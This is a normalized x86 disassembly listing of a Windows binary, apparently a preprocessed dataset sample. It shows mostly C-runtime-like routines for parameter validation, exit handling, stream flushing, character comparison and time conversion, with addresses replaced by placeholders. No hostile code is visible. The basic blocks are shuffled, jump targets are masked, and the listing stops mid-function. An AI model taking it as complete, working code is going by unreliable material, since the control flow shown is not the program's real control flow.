pop ecx
mov [ ebp - 0x4 ] esi
call sub_20125d6
add eax ebx
push eax
call sub_201848e
pop ecx
mov edi eax
lea eax [ ebp + 0xc ]
push eax
push esi
push [ ebp + 0x8 ]
call sub_20125d6
add eax ebx
push eax
call sub_200fdd2
mov [ ebp - 0x1c ] eax
call sub_20125d6
add eax ebx
push eax
push edi
call sub_201852a
add esp 0x18
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200b5e9
mov eax [ ebp - 0x1c ]
call sub_200fb13
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_200fa90
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_200db99
retn
sub_200b677
mov edi edi
push ebp
mov ebp esp
mov ecx [ rw-data ]
mov edx [ ebp + 0x8 ]
or ecx 0x1
xor eax eax
cmp [ rw-data ] ecx
sete al
neg edx
sbb edx edx
and edx ecx
mov [ rw-data ] edx
pop ebp
retn
sub_200b6b7
mov edi edi
push ebp
mov ebp esp
push edi
mov edi 0x3e8
pop edi
pop ebp
retn
test eax eax
je r-xdata
push edi
call [ Sleep@IAT ]
push [ ebp + 0x8 ]
call [ GetModuleHandleW@IAT ]
add edi 0x3e8
cmp edi 0xea60
ja r-xdata
sub_200b6e7
mov edi edi
push ebp
mov ebp esp
call sub_200ca7e
push [ ebp + 0x8 ]
call sub_200c8ad
push [ rw-data ]
call sub_200d4ca
push 0xff
call eax
add esp 0xc
pop ebp
retn
sub_200b710
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_200b765
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
add esi 0x4
call eax
sub_200b782
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_200b7a6
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
xor esi esi
cmp ecx esi
jne r-xdata
mov eax [ rw-data ]
cmp eax esi
je r-xdata
call sub_200fb13
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
push 0x16
pop eax
jmp r-xdata
mov [ ecx ] eax
xor eax eax
pop esi
pop ebp
retn
sub_200b7e2
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
xor esi esi
cmp ecx esi
jne r-xdata
mov eax [ rw-data ]
cmp eax esi
je r-xdata
call sub_200fb13
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
push 0x16
pop eax
jmp r-xdata
mov [ ecx ] eax
xor eax eax
pop esi
pop ebp
retn
sub_200b81e
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_20187d7
push r--data
push r--data
call sub_200b782
pop ecx
pop ecx
test eax eax
jne r-xdata
push rw-data
call sub_2018890
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push sub_200d40f
call sub_20187c0
mov eax r--data
mov [ esp ] r--data
call sub_200b765
cmp [ rw-data ] 0x0
pop ecx
je r-xdata
push [ ebp + 0x8 ]
call [ rw-data ]
pop ecx
xor eax eax
push rw-data
call sub_2018890
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_200b8a3
push 0x18
push r--data
call sub_200db54
push 0x8
call sub_2010e3c
pop ecx
and [ ebp - 0x4 ] 0x0
xor ebx ebx
inc ebx
cmp [ rw-data ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200b9ba
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_200db99
retn
mov [ rw-data ] ebx
push 0x8
call sub_2010d4a
pop ecx
push [ ebp + 0x8 ]
call sub_200b73b
push r--data
mov eax r--data
call sub_200b765
pop ecx
push [ rw-data ]
call sub_200d4ca
pop ecx
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
je r-xdata
push r--data
mov eax r--data
call sub_200b765
pop ecx
push [ rw-data ]
call sub_200d4ca
pop ecx
mov esi eax
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] esi
call sub_200d4c1
cmp [ esi ] eax
je r-xdata
sub esi 0x4
mov [ ebp - 0x24 ] esi
cmp esi edi
jb r-xdata
cmp esi edi
jb r-xdata
push [ esi ]
call sub_200d4ca
mov edi eax
call sub_200d4c1
mov [ esi ] eax
call edi
push [ rw-data ]
call sub_200d4ca
mov edi eax
push [ rw-data ]
call sub_200d4ca
add esp 0xc
cmp [ ebp - 0x1c ] edi
jne r-xdata
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x20 ] eax
mov esi eax
mov [ ebp - 0x24 ] esi
cmp [ ebp - 0x20 ] eax
je r-xdata
mov edi [ ebp - 0x28 ]
jmp r-xdata
sub_200ba19
mov edi edi
push esi
call sub_200d4c1
mov esi eax
push esi
call sub_2011e8e
push esi
call sub_2019183
push esi
call sub_200f91a
push esi
call sub_2019174
push esi
call sub_2018ede
push esi
call sub_20189e2
push esi
call sub_200cab7
push esi
call sub_20189d1
push sub_200b9e5
call sub_200d44f
add esp 0x24
mov [ rw-data ] eax
pop esi
retn
sub_200ba67
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_20134c9
pop ecx
push eax
call sub_2013d2d
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_200bacf
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_200ba67
pop ecx
test eax eax
je r-xdata
push esi
call sub_200bb17
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_20134c9
push eax
call sub_20191f2
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_200bb17
push 0x14
push r--data
call sub_200db54
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_2010e3c
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200bbe8
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_200db99
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_20126ee
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_200bbb9
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_200bacf
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_200bacf
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_200bbf1
push 0xc
push r--data
call sub_200db54
xor esi esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
push [ ebp + 0x8 ]
call sub_20126ad
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
call sub_200bacf
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200bc3a
mov eax [ ebp - 0x1c ]
push esi
call sub_200bb17
pop ecx
jmp r-xdata
call sub_200db99
retn
sub_200bc4d
mov edi edi
push ebp
mov ebp esp
call sub_200d753
push [ ebp + 0x10 ]
add eax 0x20
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_20192d3
add esp 0x10
pop ebp
retn
sub_200bc85
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x18 ]
call sub_20099ee
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200b28b
add esp 0xc
cmp [ ebp - 0xc ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
cmp [ ebp - 0xc ] bl
je r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
push esi
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
cmp [ ebp - 0xc ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx [ ebp - 0x8 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
movzx ecx dx
movzx cx [ ecx + 0x11d ]
movzx ecx cx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov dl [ edx ]
cmp dl bl
jne r-xdata
movzx ecx [ edi ]
test [ ecx + eax + 0x1d ] 0x4
mov [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
movzx edx [ ebp - 0x4 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov [ ebp - 0x8 ] ecx
shl ecx 0x8
movzx dx dl
or cx dx
inc [ ebp + 0x8 ]
movzx ecx cx
mov si cx
mov [ ebp - 0x8 ] ecx
cmp si [ eax + 0x10 ]
jb r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
movzx ecx cx
mov si bx
jmp r-xdata
movzx ecx dx
movzx cx [ ecx + 0x11d ]
movzx ecx cx
jmp r-xdata
mov dl [ edi ]
dec [ ebp + 0x10 ]
cmp dl bl
je r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
cmp si [ eax + 0x16 ]
jb r-xdata
cmp si [ eax + 0x12 ]
ja r-xdata
mov si [ ebp - 0x8 ]
xor eax eax
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov [ ebp - 0x4 ] ecx
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0xc ] bl
je r-xdata
cmp si bx
je r-xdata
shl ecx 0x8
movzx dx dl
or cx dx
movzx ecx cx
inc edi
mov [ ebp - 0x4 ] ecx
cmp cx [ eax + 0x10 ]
jb r-xdata
mov cx [ ebp - 0x4 ]
movzx cx [ edi ]
movzx ecx cx
movzx edx cl
inc edi
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x4 ] ecx
je r-xdata
cmp si [ eax + 0x18 ]
ja r-xdata
add si [ eax + 0x14 ]
jmp r-xdata
pop esi
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
cmp cx [ eax + 0x16 ]
jb r-xdata
cmp cx [ eax + 0x12 ]
ja r-xdata
add si [ eax + 0x1a ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
movzx cx [ ecx ]
dec [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
movzx ecx cx
movzx edx cl
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x8 ] ecx
je r-xdata
cmp cx si
jne r-xdata
cmp cx [ eax + 0x18 ]
ja r-xdata
add cx [ eax + 0x14 ]
jmp r-xdata
add cx [ eax + 0x1a ]
jmp r-xdata
sub_200beca
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_200f929
add esp 0x14
sub_200beee
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ebx
cmp esi ebx
jne r-xdata
push edi
push 0x24
push 0xff
push esi
call sub_2013580
mov edi [ ebp + 0xc ]
add esp 0xc
cmp edi ebx
jne r-xdata
call sub_200fb13
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_200fa90
add esp 0x14
mov eax esi
jmp r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
mov ecx [ edi ]
jg r-xdata
call sub_200fb13
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_200fa90
add esp 0x14
jmp r-xdata
pop esi
pop ebx
leave
retn
cmp eax 0x7
jl r-xdata
jl r-xdata
mov eax esi
jmp r-xdata
call sub_2019c04
lea eax [ ebp - 0x8 ]
push eax
call sub_2019f36
pop ecx
test eax eax
je r-xdata
jg r-xdata
call sub_200fb13
push 0x16
pop esi
mov [ eax ] esi
cmp ecx ebx
jb r-xdata
pop edi
lea eax [ ebp - 0xc ]
push eax
call sub_2019f6f
pop ecx
test eax eax
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_200f929
add esp 0x14
cmp ecx 0x93406fff
jbe r-xdata
lea eax [ ebp - 0x4 ]
push eax
call sub_2019fa8
pop ecx
test eax eax
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_200f929
add esp 0x14
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
cmp ecx ebx
mov edi [ edi ]
jl r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_200f929
add esp 0x14
push eax
push esi
call sub_2019ccc
pop ecx
pop ecx
cmp eax ebx
jne r-xdata
jg r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cdq
sub edi eax
lea eax [ ebp - 0x14 ]
push eax
sbb ecx edx
push esi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] ecx
call sub_2019ccc
pop ecx
pop ecx
cmp eax ebx
jne r-xdata
cmp edi 0x3f480
jbe r-xdata
mov eax [ esi ]
cdq
mov edi eax
mov eax [ ebp - 0x4 ]
mov ebx edx
cdq
sub edi eax
sbb ebx edx
push esi
call sub_2019c8b
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
push 0x0
push 0x3c
push ebx
push edi
call sub_201a0a0
mov edi eax
mov eax [ esi + 0x4 ]
mov ebx edx
cdq
push 0x0
add edi eax
push 0x3c
adc ebx edx
push ebx
push edi
call sub_201a150
mov [ esi + 0x4 ] eax
test eax eax
jge r-xdata
add eax 0x3c
add edi 0xffffffc4
mov [ esi ] eax
adc ebx 0xffffffff
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
add eax ecx
cdq
mov ecx eax
mov eax edx
mov [ ebp + 0x8 ] eax
mov eax [ esi ]
cdq
mov edi eax
sub edi ecx
mov ecx [ ebp + 0x8 ]
mov ebx edx
sbb ebx ecx
mov [ esi + 0x20 ] 0x1
jmp r-xdata
xor eax eax
push esi
call sub_2019c8b
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x3c
push ebx
push edi
call sub_201a0a0
mov edi eax
mov eax [ esi + 0x8 ]
mov ebx edx
cdq
push 0x0
add edi eax
push 0x18
adc ebx edx
push ebx
push edi
call sub_201a150
mov [ esi + 0x8 ] eax
test eax eax
jge r-xdata
add eax 0x3c
add edi 0xffffffc4
mov [ esi + 0x4 ] eax
adc ebx 0xffffffff
push 0x0
push 0x3c
push ebx
push edi
call sub_201a150
mov [ esi ] eax
test eax eax
jge r-xdata
mov eax [ ebp - 0xc ]
cdq
sub [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
push eax
sbb [ ebp - 0x10 ] edx
push esi
call sub_2019ccc
pop ecx
pop ecx
cmp eax ebx
jne r-xdata
push 0x0
push 0x18
push ebx
push edi
call sub_201a0a0
mov ecx eax
test edx edx
jl r-xdata
add eax 0x18
add edi 0xffffffe8
mov [ esi + 0x8 ] eax
adc ebx 0xffffffff
mov [ esi + 0x20 ] 0x1
jmp r-xdata
mov eax [ esi + 0x18 ]
lea eax [ ecx + eax + 0x7 ]
cdq
push 0x7
pop edi
idiv edi
add [ esi + 0xc ] ecx
mov eax [ esi + 0xc ]
mov [ esi + 0x18 ] edx
test eax eax
jg r-xdata
jg r-xdata
add [ esi + 0x1c ] ecx
add ecx 0x16d
add [ esi + 0x1c ] ecx
add eax 0x1f
dec [ esi + 0x14 ]
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] 0xb
jmp r-xdata
mov eax [ esi + 0x18 ]
add eax ecx
push 0x7
cdq
pop edi
idiv edi
add [ esi + 0xc ] ecx
mov [ esi + 0x18 ] edx
test ecx ecx
jbe r-xdata
test edx edx
jg r-xdata
jl r-xdata
test ecx ecx
jae r-xdata
sub_200c1a6
mov edi edi
push ebp
mov ebp esp
push esi
call sub_201a335
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
push esi
call sub_200beee
neg eax
sbb eax eax
pop ecx
not eax
pop ecx
and eax esi
sub_200c1cd
push 0x18
push r--data
call sub_200db54
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
xor ebx ebx
cmp eax ebx
jne r-xdata
xor eax eax
cmp [ ebp + 0xc ] ebx
setge al
cmp eax ebx
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_200fb13
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_200fa90
add esp 0x14
xor eax eax
mov esi [ ebp + 0x10 ]
cmp esi ebx
setne al
cmp eax ebx
je r-xdata
call sub_200db99
retn
cmp [ ebp + 0xc ] ebx
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x24 ] esi
push esi
call sub_20126ad
pop ecx
mov [ ebp - 0x4 ] ebx
test [ esi + 0xc ] 0x40
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push esi
call sub_20134c9
pop ecx
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200c30d
mov eax [ ebp - 0x1c ]
mov edi [ ebp - 0x20 ]
mov ecx rw-data
cmp eax 0xfffffffe
je r-xdata
mov [ edi ] bl
dec [ esi + 0x4 ]
js r-xdata
call sub_200fb13
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_200fa90
add esp 0x14
mov [ ebp - 0x1c ] ebx
cmp eax 0xffffffff
je r-xdata
mov edx eax
sar edx 0x5
mov ecx eax
and ecx 0x1f
shl ecx 0x6
add ecx [ edx * 4 + rw-data ]
jmp r-xdata
push esi
call sub_2012cdf
pop ecx
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
mov eax rw-data
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
mov [ edi ] al
inc edi
mov [ ebp - 0x20 ] edi
cmp al 0xa
jne r-xdata
cmp edi [ ebp + 0x8 ]
jne r-xdata
mov [ ebp - 0x28 ] eax
cmp eax 0xffffffff
jne r-xdata
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
dec [ ebp + 0xc ]
je r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
sub_200c315
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_20099ee
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
cmp esi ebx
jne r-xdata
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
push edi
mov edi [ ebp - 0xc ]
cmp [ edi + 0x8 ] ebx
jne r-xdata
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp + 0x8 ]
movzx ax [ eax ]
inc [ ebp + 0x8 ]
movzx ecx ax
movzx eax cl
test [ eax + edi + 0x1d ] 0x4
je r-xdata
push esi
push [ ebp + 0x8 ]
call sub_201a3a0
pop ecx
pop ecx
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
movzx ax [ esi ]
movzx eax ax
movzx edx al
inc esi
test [ edx + edi + 0x1d ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax ]
cmp al bl
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop esi
cmp ax cx
jne r-xdata
mov dl [ esi ]
cmp dl bl
jne r-xdata
shl ecx 0x8
movzx ax al
or cx ax
inc [ ebp + 0x8 ]
movzx ecx cx
xor ecx ecx
jmp r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sbb eax eax
and eax 0x2
dec eax
cmp cx bx
jne r-xdata
shl eax 0x8
movzx dx dl
or ax dx
movzx eax ax
inc esi
xor eax eax
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_200c453
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_20099ee
mov eax [ ebp - 0x14 ]
xor ebx ebx
cmp [ eax + 0x8 ] ebx
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax ebx
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2009fc0
pop ecx
pop ecx
cmp [ ebp - 0xc ] bl
je r-xdata
cmp [ eax ] bl
jne r-xdata
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
cmp [ ebp - 0xc ] bl
je r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
jne r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
push edi
push eax
mov edi esi
call sub_2016140
mov [ ebp - 0x8 ] esi
sub [ ebp - 0x8 ] eax
push esi
call sub_2016140
add eax [ ebp - 0x8 ]
pop ecx
pop ecx
cmp [ esi ] bl
je r-xdata
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
cmp [ ebp - 0xc ] bl
je r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] bl
je r-xdata
sub esi [ ebp + 0xc ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ edi ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x1 ] dl
cmp dl bl
je r-xdata
pop esi
cmp [ ecx ] bl
je r-xdata
mov dl [ ecx ]
cmp dl bl
je r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
movzx ecx [ ebp - 0x1 ]
mov edx [ ebp - 0x14 ]
mov cl [ ecx + edx + 0x1d ]
and cl 0x4
inc edi
inc esi
test cl cl
je r-xdata
cmp [ esi + ecx ] dl
jne r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ edi ] bl
jne r-xdata
cmp [ edi ] bl
je r-xdata
inc ecx
cmp [ esi + ecx ] bl
jne r-xdata
pop edi
cmp edi eax
ja r-xdata
inc edi
inc esi
sub_200c5ab
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
mov [ ebp - 0x1c ] eax
cmp ecx eax
ja r-xdata
cmp esi ebx
jne r-xdata
pop ebx
leave
retn
push edi
push [ ebp + 0x18 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x14 ]
mov [ ebp - 0x14 ] 0x42
push [ ebp + 0x10 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x20 ] esi
call sub_200fdd2
add esp 0x10
mov edi eax
cmp esi ebx
je r-xdata
mov [ ebp - 0x1c ] ecx
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop edi
dec [ ebp - 0x1c ]
js r-xdata
pop esi
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_200fbfc
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax edi
sub_200c67b
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x14 ]
call sub_20099ee
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200b28b
add esp 0xc
cmp [ ebp - 0x8 ] bl
je r-xdata
pop ebx
leave
retn
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
cmp [ ebp - 0x8 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
push esi
pop edi
movzx edx [ ebp - 0x4 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
mov dl [ edi ]
cmp dl bl
jne r-xdata
movzx ecx dx
movzx cx [ ecx + 0x11d ]
movzx ecx cx
jmp r-xdata
shl ecx 0x8
movzx dx dl
or cx dx
movzx ecx cx
mov si cx
inc edi
mov [ ebp - 0x4 ] ecx
cmp si [ eax + 0x10 ]
jb r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
movzx edx [ ebp - 0x4 ]
